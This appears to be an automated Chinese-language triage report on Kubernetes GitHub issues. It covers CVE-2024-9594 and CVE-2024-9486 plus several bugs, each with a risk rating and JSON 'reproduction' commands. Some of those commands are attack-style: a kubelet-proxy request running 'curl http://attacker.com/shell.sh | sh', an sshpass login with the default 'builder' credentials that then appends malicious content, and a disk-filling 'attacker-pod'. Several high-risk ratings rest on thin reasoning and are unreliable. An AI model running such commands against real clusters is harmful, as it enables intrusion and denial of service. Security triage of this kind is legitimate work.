- create a loopback device -> `dd if=/dev/zero of=/srv/iscsi/file.img count=102400 && losetup /dev/loop1 /srv/iscsi/file.img`
- partition the loopback device -> `fdisk /dev/loop1`
- configure iSCSI initiator using `targetcli` with  `/dev/loop1` as backing block device
- discover and attach iSCSI disk to node using both local and loopback IPs to simulate multipath
- enable multipath with `mpathconf --enable --with_multipathd y`
- start local Kubernetes with `local-up-cluster.sh`
- create PV, PVC and Pod:

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
  name: fc-pv
  labels:
    volumeName: fc-pv-01
spec:
  volumeMode: Block
  accessModes:
    - ReadWriteOnce
  capacity:
    storage: 50M
  fc:
    wwids: ['36001405f3392bf76369422cbfd8acd80']
```

```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: fc-pvc
spec:
  volumeMode: Block
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 50M
  selector:
    matchLabels:
      volumeName: fc-pv-01
```

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: fc-pod
spec:
  containers:
  - name: busybox
    image: busybox
    command: [ "sh", "-c", "sleep infinity" ]
    volumeDevices:
      - name: fc-storage
        devicePath: /dev/data
  volumes:
  - name: fc-storage
    persistentVolumeClaim:
      claimName: fc-pvc
```

- inspect running pod for attached devices with chosen container runtime -> `crictl inspect <pod_id> | grep -A3 /dev/data`

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.32.0-alpha.0.1350+fc93fcdcf2dbcd
```

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Fedora Linux"
VERSION="39 (Workstation Edition)"
ID=fedora
VERSION_ID=39
VERSION_CODENAME=""
PLATFORM_ID="platform:f39"
PRETTY_NAME="Fedora Linux 39 (Workstation Edition)"
ANSI_COLOR="0;38;2;60;110;180"
LOGO=fedora-logo-icon
CPE_NAME="cpe:/o:fedoraproject:fedora:39"
DEFAULT_HOSTNAME="fedora"
HOME_URL="https://fedoraproject.org/"
DOCUMENTATION_URL="https://docs.fedoraproject.org/en-US/fedora/f39/system-administrators-guide/"
SUPPORT_URL="https://ask.fedoraproject.org/"
BUG_REPORT_URL="https://bugzilla.redhat.com/"
REDHAT_BUGZILLA_PRODUCT="Fedora"
REDHAT_BUGZILLA_PRODUCT_VERSION=39
REDHAT_SUPPORT_PRODUCT="Fedora"
REDHAT_SUPPORT_PRODUCT_VERSION=39
SUPPORT_END=2024-11-12
VARIANT="Workstation Edition"
VARIANT_ID=workstation
$ uname -a
Linux fedora 6.9.5-100.fc39.x86_64 #1 SMP PREEMPT_DYNAMIC Sun Jun 16 15:57:19 UTC 2024 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
N/A
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
$ crictl version
Version:  0.1.0
RuntimeName:  cri-o
RuntimeVersion:  1.27.2
RuntimeApiVersion:  v1
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
N/A
</details>


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
该Issue描述了在Kubernetes中，当worker节点配置了multipath并且symlink在`/dev/disk/by-id`下直接指向设备映射器设备（如dm-X）时，Kubernetes的FC/iSCSI卷插件可能无法正确处理，导致找到错误的设备，可能会将分区作为设备挂载到Pod中。

这种错误的设备解析可能导致Pod访问到意外的分区，如果这些分区包含了其他用户或系统的敏感数据，攻击者可以利用此漏洞在多租户环境中访问未经授权的数据，造成数据泄露或破坏。

根据风险判断标准第9条，如果在多用户场景中，一个低权限用户能够影响和自己权限一样甚至更高的其他用户，则应判断为高风险。因此，此问题可能导致高安全风险，应视为高风险漏洞。

**复现过程：**

```json
[
  {
    "cmd": "dd if=/dev/zero of=/srv/iscsi/file.img bs=1M count=100",
    "explain": "创建一个用于模拟iSCSI设备的100MB空白镜像文件。"
  },
  {
    "cmd": "losetup /dev/loop1 /srv/iscsi/file.img",
    "explain": "将创建的镜像文件绑定到loopback设备/dev/loop1。"
  },
  {
    "cmd": "echo -e \"o\\nn\\np\\n1\\n\\n\\nw\" | fdisk /dev/loop1",
    "explain": "对loopback设备进行分区，创建一个主分区。"
  },
  {
    "cmd": "targetcli /backstores/block create name=iscsi_disk dev=/dev/loop1",
    "explain": "使用targetcli创建一个块设备后端，名称为iscsi_disk，设备为/dev/loop1。"
  },
  {
    "cmd": "targetcli /iscsi create iqn.2023-10.com.example:storage",
    "explain": "创建一个iSCSI目标，IQN为iqn.2023-10.com.example:storage。"
  },
  {
    "cmd": "targetcli /iscsi/iqn.2023-10.com.example:storage/tpg1/luns create /backstores/block/iscsi_disk",
    "explain": "将之前创建的块设备后端映射为iSCSI目标的LUN。"
  },
  {
    "cmd": "targetcli /iscsi/iqn.2023-10.com.example:storage/tpg1/acls create iqn.2023-10.com.example:initiator",
    "explain": "为iSCSI目标添加一个ACL，允许指定的initiator访问。"
  },
  {
    "cmd": "iscsiadm -m discovery -t sendtargets -p 127.0.0.1",
    "explain": "在本地节点上发现iSCSI目标。"
  },
  {
    "cmd": "iscsiadm -m node -T iqn.2023-10.com.example:storage -p 127.0.0.1 --login",
    "explain": "登录到iSCSI目标，建立会话。"
  },
  {
    "cmd": "mpathconf --enable --with_multipathd y",
    "explain": "启用multipath并启动multipathd守护进程。"
  },
  {
    "cmd": "./local-up-cluster.sh",
    "explain": "启动本地的Kubernetes集群。"
  },
  {
    "cmd": "kubectl apply -f fc-pv.yaml",
    "explain": "创建FC类型的PersistentVolume。"
  },
  {
    "cmd": "kubectl apply -f fc-pvc.yaml",
    "explain": "创建PersistentVolumeClaim。"
  },
  {
    "cmd": "kubectl apply -f fc-pod.yaml",
    "explain": "创建使用上述PVC的Pod。"
  },
  {
    "cmd": "crictl ps | grep fc-pod | awk '{print $1}' | xargs crictl inspect | grep -A3 /dev/data",
    "explain": "检查运行中的Pod，查看其挂载的设备信息。"
  },
  {
    "cmd": "ls -l /dev/disk/by-id/ | grep dm-",
    "explain": "查看设备映射器中的设备及其符号链接关系。"
  },
  {
    "cmd": "lsblk",
    "explain": "查看块设备列表，确定哪个设备是multipath设备，哪个是分区。"
  }
]
```

---

## Issue #128007 CVE-2024-9594: VM images built with Image Builder with some providers use default credentials during builds

- Issue 链接：[#128007](https://github.com/kubernetes/kubernetes/issues/128007)

### Issue 内容

CVSS Rating: [CVSS:3.1/AV:A/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:A/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H)

A security issue was discovered in the Kubernetes Image Builder where default credentials are enabled during the image build process when using the Nutanix, OVA, QEMU or raw providers. The credentials can be used to gain root access. The credentials are disabled at the conclusion of the image build process. Kubernetes clusters are only affected if their nodes use VM images created via the Image Builder project. 

#### Am I vulnerable?

Clusters using virtual machine images built with Kubernetes Image Builder (https://github.com/kubernetes-sigs/image-builder) version v0.1.37 or earlier are affected if built with the Nutanix, OVA, QEMU or raw providers. These images were vulnerable during the image build process and are affected only if an attacker was able to reach the VM where the image build was happening and used the vulnerability to modify the image at the time the image build was occurring.

VMs using images built with the Proxmox provider are affected by a related, but much more serious vulnerability (see #128006).

VMs using images built with all other providers are not affected by this issue.

To determine the version of Image Builder you are using, use one of the following methods:
- For git clones of the image builder repository:
```
    cd <local path to image builder repo>
    make version
```
- For installations using a tarball download:
```
    cd <local path to install location>
    grep -o v0\\.[0-9.]* RELEASE.md | head -1
```
- For a container image release:
    `docker run --rm <image pull spec> version`
  or
    `podman run --rm <image pull spec> version`
  or look at the image tag specified, in the case of an official image such as `registry.k8s.io/scl-image-builder/cluster-node-image-builder-amd64:v0.1.37`


##### Affected Versions

- Kubernetes Image Builder versions <= v0.1.37

#### How do I mitigate this vulnerability?

Rebuild any affected images using a fixed version of Image Builder. Re-deploy the fixed images to any affected VMs.

##### Fixed Versions

- Kubernetes Image Builder master - fixed by https://github.com/kubernetes-sigs/image-builder/pull/1596
- Fixed in Kubernetes Image Builder release v0.1.38

#### Detection

The linux command `last builder` can be used to view logins to the affected `builder` account.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

## Additional Details

The fixed version sets a randomly-generated password for the duration of the image build

##### Acknowledgements

This vulnerability was reported by Nicolai Rybnikar @rybnico from Rybnikar Enterprises GmbH.

The issue was fixed and coordinated by Marcus Noble of the Image Builder project.

/area security
/kind bug
/committee security-response
/label official-cve-feed
/sig cluster-lifecycle

### 分析结果

**风险定级：**  
高风险

**判断依据：**  
在Kubernetes Image Builder中，使用Nutanix、OVA、QEMU或raw providers时，镜像构建过程中启用了默认凭证。这些默认凭证可以被用于获取root权限，虽然在镜像构建结束后，这些凭证会被禁用。

攻击者如果能够在镜像构建过程中访问正在构建的VM，就可以利用这些默认凭证登录，获取root权限，对镜像进行未授权的修改，例如植入后门或恶意代码。这会导致使用该镜像部署的集群存在安全隐患，可能遭受远程控制、数据泄露等攻击。

根据风险判断标准：

1. **该风险能被攻击者利用**：攻击者可以利用默认凭证获取root权限，属于高风险。
2. **攻击者可进行命令执行、提权等高风险操作**：符合第8条，无论攻击者是否需要权限，都应判断为高风险。

因此，该Issue存在**高风险**。

**复现过程：**

```json
[
  {
    "cmd": "sshpass -p 'builder' ssh builder@<ip_address>",
    "explain": "使用默认用户名和密码'builder'连接到正在构建的VM。"
  },
  {
    "cmd": "sudo su -",
    "explain": "成功登录后，切换到root用户。"
  },
  {
    "cmd": "echo '恶意内容' >> /path/to/target/file",
    "explain": "在VM中执行命令，插入恶意内容到镜像中。"
  }
]
```

---

## Issue #128006 CVE-2024-9486: VM images built with Image Builder and Proxmox provider use default credentials

- Issue 链接：[#128006](https://github.com/kubernetes/kubernetes/issues/128006)

### Issue 内容

CVSS Rating: [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

A security issue was discovered in the Kubernetes Image Builder where default credentials are enabled during the image build process. Additionally, virtual machine images built using the Proxmox provider do not disable these default credentials, and nodes using the resulting images may be accessible via these default credentials. The credentials can be used to gain root access. Kubernetes clusters are only affected if their nodes use VM images created via the Image Builder project with its Proxmox provider. 

#### Am I vulnerable?

Clusters using virtual machine images built with Kubernetes Image Builder (https://github.com/kubernetes-sigs/image-builder) version v0.1.37 or earlier are affected if built with the Proxmox provider.

VMs using images built with all other providers are not affected by this issue.  See #128007 for a related issue which affects some other providers.

To determine the version of Image Builder you are using, use one of the following methods:
- For git clones of the image builder repository:
```
    cd <local path to image builder repo>
    make version
```
- For installations using a tarball download:
```
    cd <local path to install location>
    grep -o v0\\.[0-9.]* RELEASE.md | head -1
```
- For a container image release:
    `docker run --rm <image pull spec> version`
  or
    `podman run --rm <image pull spec> version`
  or look at the image tag specified, in the case of an official image such as `registry.k8s.io/scl-image-builder/cluster-node-image-builder-amd64:v0.1.37`


##### Affected Versions

- Kubernetes Image Builder versions <= v0.1.37

#### How do I mitigate this vulnerability?

Rebuild any affected images using a fixed version of Image Builder. Re-deploy the fixed images to any affected VMs.

Prior to upgrading, this vulnerability can be mitigated by disabling the builder account on affected VMs:
usermod -L builder

##### Fixed Versions

- Kubernetes Image Builder master - fixed by https://github.com/kubernetes-sigs/image-builder/pull/1595
- Fixed in Kubernetes Image Builder release v0.1.38

#### Detection

The linux command `last builder` can be used to view logins to the affected `builder` account.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

## Additional Details

The fixed version makes two changes to remedy this bug:
- It sets a randomly-generated password for the duration of the image build
- It disables the builder account at the conclusion of the image build

##### Acknowledgements

This vulnerability was reported by Nicolai Rybnikar @rybnico from Rybnikar Enterprises GmbH.

The issue was fixed and coordinated by Marcus Noble of the Image Builder project.

/area security
/kind bug
/committee security-response
/label official-cve-feed
/sig cluster-lifecycle


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
该Issue描述了Kubernetes Image Builder在使用Proxmox提供商时存在的安全漏洞。具体来说，使用版本v0.1.37或更早版本构建的虚拟机镜像会启用默认凭据，这些默认凭据在生成的镜像中未被禁用。结果是，使用这些镜像的节点可能通过这些默认凭据被访问，攻击者可以利用这些凭据获取root权限。

根据CVSS评分 [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]，该漏洞的指标为：

- **攻击向量（AV）**：网络（N）
- **攻击复杂度（AC）**：低（L）
- **所需权限（PR）**：无（N）
- **用户交互（UI）**：无（N）
- **作用范围（S）**：未变（U）
- **机密性影响（C）**：高（H）
- **完整性影响（I）**：高（H）
- **可用性影响（A）**：高（H）

根据这些指标，漏洞的CVSS评分为**9.8**，属于高危级别。

**风险分析：**

- **可被攻击者利用**：攻击者可以通过网络远程使用默认凭据登录受影响的节点，获取root权限。
- **可能成为高危漏洞**：已被分配CVE-2024-9486，CVSS评分为高危（9.8）。
- **可能导致高安全风险**：攻击者获得root权限后，可能执行任意命令、窃取敏感信息、破坏系统完整性和可用性。

根据风险判断标准，该漏洞满足高风险条件，需要立即采取措施修复。

---

## Issue #128001 kube-api proxy does not proxy to kubelet running on `127.0.0.1`

- Issue 链接：[#128001](https://github.com/kubernetes/kubernetes/issues/128001)

### Issue 内容

#### What happened?

While running Kubernetes locally, using `./hack/local-cluster-up.sh`, I wanted to send requests to the kubelet `proxy` endpoint in the api-server, like this:

```
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"   https://localhost:6443/api/v1/nodes/127.0.0.1/proxy/healthz
```

The response returned a `400` HTTP status code and the message was `address not allowed`.

#### What did you expect to happen?

I've expected that the request is able to proxy to IP address `127.0.0.1` successfully because it is the node's IP address.

#### How can we reproduce it (as minimally and precisely as possible)?

Run kubernetes with `hack/local-up-cluster.sh` scripts locally (or kubelet running on 127.0.0.1).

Assign the `system:kubelet-api-admin` role to Pod's service account, mount the Service Account token and run the following curl command:

curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"   https://localhost:6443/api/v1/nodes/127.0.0.1/proxy/healthz


#### Anything else we need to know?

The following check for a Global Unicast address causes the error message: https://github.com/kubernetes/kubernetes/blob/1dc05009fe7f4e1d139b0c8394683edb54f8d082/pkg/registry/core/node/strategy.go#L248-L250

I think there should a special case to handle when kubelet runs on 127.0.0.1 and is accessible.

#### Kubernetes version

<details>

```console
$ kubectl version
Server Version: version.Info{Major:"1", Minor:"30", GitVersion:"v1.30.0", GitCommit:"7c48c2bd72b9bf5c44d21d7338cc7bea77d0ad2a", GitTreeState:"clean", BuildDate:"2024-05-13T22:00:36Z", GoVersion:"go1.22.2", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
localhost 
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Fedora Linux"
VERSION="39 (Workstation Edition)"
ID=fedora
VERSION_ID=39
VERSION_CODENAME=""
PLATFORM_ID="platform:f39"
PRETTY_NAME="Fedora Linux 39 (Workstation Edition)"
ANSI_COLOR="0;38;2;60;110;180"
LOGO=fedora-logo-icon
CPE_NAME="cpe:/o:fedoraproject:fedora:39"
DEFAULT_HOSTNAME="fedora"
HOME_URL="https://fedoraproject.org/"
DOCUMENTATION_URL="https://docs.fedoraproject.org/en-US/fedora/f39/system-administrators-guide/"
SUPPORT_URL="https://ask.fedoraproject.org/"
BUG_REPORT_URL="https://bugzilla.redhat.com/"
REDHAT_BUGZILLA_PRODUCT="Fedora"
REDHAT_BUGZILLA_PRODUCT_VERSION=39
REDHAT_SUPPORT_PRODUCT="Fedora"
REDHAT_SUPPORT_PRODUCT_VERSION=39
SUPPORT_END=2024-11-12
VARIANT="Workstation Edition"
VARIANT_ID=workstation

$ uname -a
Linux XXXXXXXX 6.10.10-100.fc39.x86_64 #1 SMP PREEMPT_DYNAMIC Thu Sep 12 16:02:41 UTC 2024 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
该Issue提出希望kube-api proxy能够代理到运行在`127.0.0.1`上的kubelet，但目前被拒绝，返回`address not allowed`。这是因为Kubernetes的API Server在代理请求时，会检查目标节点的IP地址，只有当IP地址是Global Unicast Address时才允许代理。`127.0.0.1`是本地回环地址（Loopback Address），不属于Global Unicast Address，因此被拒绝。

如果修改API Server的策略，允许代理到`127.0.0.1`，会引入高安全风险。攻击者可以利用这一点，通过API Server代理请求本应仅在本地主机访问的服务，如kubelet的HTTPS端口或其他本地服务，进行未授权的访问。这可能导致以下高危后果：

1. **未经授权的API访问**：攻击者可以访问kubelet的未经认证/授权的API端点，执行如获取容器信息、执行命令等操作。

2. **命令执行和权限提升**：利用未受保护的端点，攻击者可能在主机上执行任意命令，甚至逃逸出容器，获取主机权限。

3. **SSRF攻击**：通过API Server代理，攻击者可以请求本地主机上的其他服务，获取敏感信息或进行进一步的攻击。

根据风险判断标准，解除对`127.0.0.1`的限制，将导致攻击者能够利用API Server代理请求本地主机服务，属于高风险问题。

**复现过程：**

```json
[
  {
    "cmd": "curl -k -H \"Authorization: Bearer $(cat /tmp/attacker_token)\" \"https://api-server:6443/api/v1/nodes/127.0.0.1/proxy/metrics\"",
    "explain": "攻击者通过API Server代理请求，访问kubelet的`metrics`端点，获取节点的敏感指标信息。"
  },
  {
    "cmd": "curl -k -H \"Authorization: Bearer $(cat /tmp/attacker_token)\" -X POST -H \"Content-Type: application/json\" -d '{\"command\": [\"/bin/sh\",\"-c\",\"curl http://attacker.com/shell.sh | sh\"]}' \"https://api-server:6443/api/v1/nodes/127.0.0.1/proxy/run/command\"",
    "explain": "攻击者通过API Server代理请求，远程在节点上执行恶意命令，下载并执行攻击者控制的脚本，实现远程命令执行。"
  }
]
```

---

## Issue #127853 NodeSwap future works incorrect on 1.30+

- Issue 链接：[#127853](https://github.com/kubernetes/kubernetes/issues/127853)

### Issue 内容

#### What happened?

Processes inside containers do not use the swap partition, as they did before version 1.30.

#### What did you expect to happen?

Processes inside pods with QOS Burstable should use the swap partition.

#### How can we reproduce it (as minimally and precisely as possible)?

1) Create cluster on 1.30+
2) kubelet config
    ```yaml
    apiVersion: kubelet.config.k8s.io/v1beta1
      kind: KubeletConfiguration
      featureGates:
        NodeSwap: true
      memorySwap:
        swapBehavior: LimitedSwap
    ```
3) create zram partition and use it as swap (debian/ubuntu for example)
    ```bash
    apt install zram-tools
    
    cat <<EOF > /etc/default/zramswap
    ALGO=lz4
    PERCENT=100
    EOF
    
    systemctl restart zramswap.service
    sysctl vm.swappiness=100
    ```
4) On host system execute something like
    ```bash
    tail /dev/zero
    ```
    and check
    ```bash
    free -h
    ```
    When the RAM runs out, the swap partition will start to be used until the OOM-Killer kills the process.
5) Create any pod. Nginx for example
6) Execute same, but in the container
    ```bash
    tail /dev/zero
    ```
    When the RAM runs out, only a small part of the swap partition will be used. Then the OS freezes.

This was not observed in versions prior to 1.30. Working with swap was the same for both processes inside the container and for processes on the host system.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.4+rke2r1

```

</details>


#### Cloud provider

<details>
Rancher 2.9.2 + Harvester 1.3.2
</details>


#### OS version

<details>

```console
cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

uname -a
Linux jenkins-smp-branch-worker-d2c8m-bg9zt 6.1.0-25-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.106-3 (2024-08-26) x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
```bash
./containerd --version
containerd github.com/k3s-io/containerd v1.7.20-k3s1 8d2b528ea4559e4a96b8819500241cbcba7ccc15

./runc --version
runc version 1.1.12
commit: v1.1.12-0-g51d5e946
spec: 1.0.2-dev
go: go1.22.6 X:boringcrypto
libseccomp: 2.5.4
```
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
该Issue描述了在Kubernetes 1.30+版本中，容器内的进程在内存耗尽时无法正确使用Swap分区，导致操作系统冻结。这意味着一个低权限的容器内用户可以通过消耗内存，导致宿主机操作系统冻结，影响到其他用户和服务。

根据风险判断标准：

- **标准1**：该风险能够被攻击者利用，攻击者可以在容器内执行恶意进程，消耗内存资源。
- **标准2**：该风险有可能成为一个漏洞，按照CVSS 3.1评分标准，影响程度可达到高危级别。
- **标准9**：在多用户场景中，低权限用户能够影响到其他用户的服务，应判断为高风险。

因此，此问题存在高安全风险，可能导致拒绝服务（DoS）攻击，影响整个集群的稳定性。

**复现过程：**

```json
[
  {
    "cmd": "apt install zram-tools",
    "explain": "在主机上安装zram-tools工具"
  },
  {
    "cmd": "echo -e \\\"ALGO=lz4\\\\nPERCENT=100\\\" > /etc/default/zramswap",
    "explain": "配置zramswap，设置压缩算法为lz4，使用内存的100%来创建zram"
  },
  {
    "cmd": "systemctl restart zramswap.service",
    "explain": "重启zramswap服务，使配置生效"
  },
  {
    "cmd": "sysctl vm.swappiness=100",
    "explain": "设置系统的swappiness参数为100，偏好使用swap"
  },
  {
    "cmd": "tail /dev/zero",
    "explain": "在主机上执行命令，持续读取零设备，消耗内存，观察swap使用正常"
  },
  {
    "cmd": "free -h",
    "explain": "查看内存和swap的使用情况，确认swap被使用"
  },
  {
    "cmd": "kubectl run test-pod --image=nginx",
    "explain": "创建一个测试的Pod，使用nginx镜像"
  },
  {
    "cmd": "kubectl exec -it test-pod -- tail /dev/zero",
    "explain": "在容器内执行命令，持续读取零设备，消耗内存，导致宿主机内存耗尽"
  },
  {
    "cmd": "free -h",
    "explain": "在另一个终端，查看内存和swap的使用情况，发现swap未被充分使用"
  }
]
```

---

## Issue #127864 Race condition between kubelet's eviction manager and containerd's garbage collection

- Issue 链接：[#127864](https://github.com/kubernetes/kubernetes/issues/127864)

### Issue 内容

#### What happened?

Most of the containerd eviction tests have been flaky for a long time: https://testgrid.k8s.io/sig-node-containerd#node-kubelet-containerd-eviction

While debugging these test failures, I noticed that the flaky tests are writing data to the container's writable layers instead of emptyDir volumes.  The difference between the two approach is that when a pod with emptyDir volume is evicted, all the disk space consumed by emptyDir volume is immediately freed up. In case of a pod where the data is written to the container's writable layers, the disk space is not freed up until containerd asynchronously garbage collects the content.

This causes race condition with kubelet's eviction manager because even after deleting the culprit pod, it sees that the disk space is not freed up and ends up evicting an innocent pod.

We need to investigate and fix the underlying race condition between the eviction manager and the container runtime. More information about containerd garbage collection: https://github.com/containerd/containerd/blob/main/docs/garbage-collection.md

#### What did you expect to happen?

I expected that the content to be freed up as soon as the containerd is deleted.

#### How can we reproduce it (as minimally and precisely as possible)?

containerd eviction tests would be a good starting point: https://testgrid.k8s.io/sig-node-containerd#node-kubelet-containerd-eviction

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
1.30
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
该Issue描述了在使用containerd作为容器运行时的Kubernetes集群中，kubelet的驱逐管理器与containerd的垃圾回收机制之间存在竞态条件。当一个Pod将数据写入容器的可写层时，如果该Pod被驱逐，containerd不会立即释放其占用的磁盘空间，而是通过异步垃圾回收来释放。这导致kubelet的驱逐管理器在删除问题Pod后，仍检测到磁盘压力，可能进一步错误地驱逐其他无辜的Pod。

在多用户场景下，低权限用户可以利用此竞态条件，通过在其容器的可写层大量写入数据，制造磁盘压力。即使其Pod被驱逐，磁盘空间也不会立即释放，导致其他用户的Pod（可能具有相同或更高权限）被驱逐。这是一种拒绝服务（DoS）攻击。

根据风险判断标准第9条，此问题允许低权限用户影响其他用户的服务，应判断为高风险。并且，根据CVSS 3.1评分标准：

- 攻击向量（AV）：网络（N）—攻击者可以通过网络访问。
- 攻击复杂度（AC）：低（L）—攻击不需要特殊条件。
- 权限要求（PR）：低（L）—攻击者只需具备创建Pod的权限。
- 用户交互（UI）：无（N）—不需要其他用户的交互。
- 作用域（S）：改变（C）—攻击影响到其他用户的资源。
- 机密性（C）：无（N）。
- 完整性（I）：无（N）。
- 可用性（A）：高（H）—导致其他Pod被驱逐，服务不可用。

综合评分，该漏洞的CVSS评分为高（High）。因此，此Issue存在高安全风险。

**复现过程：**

```json
[
  {
    "cmd": "kubectl create ns attacker-namespace",
    "explain": "创建一个名为 attacker-namespace 的命名空间。"
  },
  {
    "cmd": "kubectl run attacker-pod -n attacker-namespace --image=busybox --restart=Never -- sh -c \"while true; do dd if=/dev/zero of=fillfile bs=10M count=100; done\"",
    "explain": "在 attacker-namespace 中创建一个名为 attacker-pod 的Pod，不断地向容器的可写层写入数据。"
  },
  {
    "cmd": "kubectl get pods -n attacker-namespace",
    "explain": "检查攻击者Pod的状态，确保其正在运行。"
  },
  {
    "cmd": "kubectl get nodes",
    "explain": "获取集群中所有节点的名称，以便后续查看节点状态。"
  },
  {
    "cmd": "kubectl describe node <NODE_NAME>",
    "explain": "查看指定节点的详细信息，监控磁盘压力情况（将 <NODE_NAME> 替换为实际的节点名称）。"
  },
  {
    "cmd": "kubectl get events --all-namespaces | grep 'Evicted'",
    "explain": "检查是否有其他命名空间的Pod被驱逐。"
  },
  {
    "cmd": "kubectl get pods -A --field-selector=status.phase=Failed",
    "explain": "获取所有状态为Failed的Pod，确认哪些Pod被驱逐。"
  }
]
```

---

# ⚠️ 存在低风险的 Issues (16 个)

## Issue #128408 liveness or readiness probes timeout does not work

- Issue 链接：[#128408](https://github.com/kubernetes/kubernetes/issues/128408)

### Issue 内容

#### What happened?

When executing livenessProbe exec command, timeoutSeconds does not work.
timeoutSeconds: 5
periodSeconds: 30
exec command: /opt/entrypoint.sh healthcheck ,healthcheck will request a url without timeout. When this URL does not respond, a liveness request is received approximately every 2 minutes.


#### What did you expect to happen?

When this URL does not respond, liveness request timed out after 5 seconds.

#### How can we reproduce it (as minimally and precisely as possible)?

Maybe sleep 120s in command, timeoutSeconds: 5, periodSeconds: 30

#### Anything else we need to know?

livenessProbe config:
```
  livenessProbe:
        exec:
          command:
            - /opt/entrypoint.sh
            - healthcheck
        initialDelaySeconds: 30
        timeoutSeconds: 5
        periodSeconds: 30
        successThreshold: 1
        failureThreshold: 12
      readinessProbe:
        exec:
          command:
            - /opt/entrypoint.sh
            - healthcheck
        initialDelaySeconds: 30
        timeoutSeconds: 5
        periodSeconds: 30
        successThreshold: 1
        failureThreshold: 12
```

#### Kubernetes version

<details>

```
Server Version: version.Info{Major:"1", Minor:"29+", GitVersion:"v1.29.8-eks-a737599", GitCommit:"3277d87d88d0bf66b6368ce57e49b2f2aab01b0d", GitTreeState:"clean", BuildDate:"2024-08-26T21:27:41Z", GoVersion:"go1.22.5", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
AWS eks
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在Kubernetes中，`livenessProbe`的`exec`命令的`timeoutSeconds`参数不起作用，导致当`exec`命令阻塞时，探针不会在指定的超时时间后超时。这可能会导致Pod无法及时重启，影响服务的可用性。

从安全角度来看，如果攻击者能够控制`healthcheck`请求的URL，并使其不响应，可能会导致Pod一直处于不健康状态，造成拒绝服务（DoS）攻击。然而，这需要攻击者能够控制或影响`healthcheck`的目标URL，或者在网络层面上进行干扰。由于该攻击需要一定的条件，且对系统的影响有限，风险评级在`high`以下，判断为低风险。

---

## Issue #128339 When containers use memory backed tmpfs and hit a OOM limit they will keep OOM on restarts.

- Issue 链接：[#128339](https://github.com/kubernetes/kubernetes/issues/128339)

### Issue 内容

#### What happened?

While aiming to promote SizeMemoryBackedVolumes to stable, tim brought up a point about what would happen if a pod that hit a OOM due to tmpfs memory limits would keep OOM as the pages are still kept around.

He is correct. If a pod hits a OOM limit with tmpfs it will keep OOM and never purge that memory

#### What did you expect to happen?

I would expect the tmpfs to be empty on a restart of the container.

#### How can we reproduce it (as minimally and precisely as possible)?

I used kind 1.30.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: example
  labels:
    app: test-pd
spec:
  restartPolicy: OnFailure
  securityContext:
    seccompProfile:
      type: RuntimeDefault
  containers:
  - image: busybox
    command:
      - /bin/sh
      - -c
      - |
         sleep infinity
    name: test-pd
    resources:
      limits:
        memory: 2Gi
    volumeMounts:
